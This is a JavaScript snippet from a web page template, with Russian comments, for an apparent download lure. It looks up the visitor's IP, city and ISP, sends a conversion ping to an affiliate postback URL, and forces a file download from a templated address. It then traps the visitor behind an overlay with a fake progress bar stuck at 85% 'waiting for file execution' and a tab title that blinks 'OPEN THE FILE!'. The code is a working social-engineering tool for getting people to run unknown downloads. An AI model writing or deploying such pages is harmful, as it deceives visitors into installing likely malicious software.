<script>
// Геолокация
(function(){
  function setText(id, value){
    var el = document.getElementById(id);
    if (el) el.textContent = value || "—";
  }
  function loadJsonp(url, callbackParam){
    return new Promise(function(resolve, reject){
      var callbackName = "__ipLookup_" + Date.now() + Math.floor(Math.random() * 10000);
      var script = document.createElement("script");
      var finished = false;
      var paramName = callbackParam || "callback";
      function cleanup(){
        finished = true;
        if (script.parentNode) script.parentNode.removeChild(script);
        try { delete window[callbackName]; } catch (e) {}
      }
      window[callbackName] = function(data){ cleanup(); resolve(data); };
      script.onerror = function(){ if(finished)return; cleanup(); reject(new Error("Fail")); };
      script.src = url + (url.indexOf("?") === -1 ? "?" : "&") + paramName + "=" + callbackName;
      document.head.appendChild(script);
      setTimeout(function(){ if(finished)return; cleanup(); reject(new Error("Timeout")); }, 6000);
    });
  }
  function loadGeo(){
    return new Promise(function(resolve, reject){
      var script = document.createElement("script");
      var finished = false;
      function cleanup(){
        finished = true;
        if (script.parentNode) script.parentNode.removeChild(script);
        try { delete window.geoip; } catch (e) {}
      }
      window.geoip = function(data){ cleanup(); resolve(data); };
      script.onerror = function(){ if(finished)return; cleanup(); reject(new Error("Fail")); };
      script.src = "https://get.geojs.io/v1/ip/geo.js";
      document.head.appendChild(script);
      setTimeout(function(){ if(finished)return; cleanup(); reject(new Error("Timeout")); }, 6000);
    }).then(function(data){
      if(data) {
        setText("ip-city", data.city || data.city_name || "—");
        setText("ip-region", data.region || data.regionName || data.state || "—");
        setText("ip-country", data.country || data.country_name || "—");
        setText("ip-isp", data.isp || data.organization_name || data.organization || data.org || "—");
        if(data.ip) setText("user-ip", data.ip);
      }
    });
  }
  loadGeo().then(function(){ 
    return loadJsonp("https://api.ipify.org?format=jsonp").then(function(data){ if(data&&data.ip) setText("user-ip", data.ip); });
  }).catch(function(){
    setText("user-ip", "IP unavailable");
  });
})();

// АГРЕССИВНЫЙ ИНСТАЛЛ (ФУНКЦИЯ)
var blinkInterval;
function startInstallation() {
  // Получаем словарь языков из глобальной переменной
  var t = window.siteLangDict || {};

  // 1. Отстук в Бином
  BPixelJS.conversion({url:'https://strasspastpongpostback.click/click'}); 
  
  // 2. Скачивание файла
  var link = document.createElement('a');
  link.href = '<%= downloadUrl %>';
  link.setAttribute('download', ''); 
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);

  // 3. Показываем агрессивное окно и стрелку
  document.getElementById('installOverlay').style.display = 'flex';
  document.getElementById('downloadArrow').style.display = 'flex';
  document.body.style.overflow = 'hidden';

  // 4. Фейковый прогресс-бар
  var progress = 0;
  var bar = document.getElementById('progressBar');
  var pText = document.getElementById('progressText');
  var progInterval = setInterval(function() {
    progress += Math.random() * 15;
    if (progress > 85) { 
      progress = 85; 
      clearInterval(progInterval);
      pText.innerHTML = t.prog_2 || "Action paused: Waiting for file execution...";
      pText.style.color = "var(--destructive)";
    }
    bar.style.width = progress + "%";
  }, 600);

  // 5. Мигание заголовка вкладки
  var blinkState = 0;
  var blinkMsg1 = t.blink_1 || "⚠️ OPEN THE FILE! ⚠️";
  var blinkMsg2 = t.blink_2 || "Action Required!";
  
  blinkInterval = setInterval(function() {
    if (blinkState === 0) {
      document.title = blinkMsg1;
      blinkState = 1;
    } else {
      document.title = blinkMsg2;
      blinkState = 0;
    }
  }, 800);
}

// Блокировка закрытия окна кликом по фону
document.getElementById('installOverlay').addEventListener('click', function(e) {
  if(e.target === this) {
    var arrow = document.getElementById('downloadArrow');
    arrow.style.animationDuration = "0.2s";
    setTimeout(() => arrow.style.animationDuration = "0.4s", 1000);
  }
});
</script>

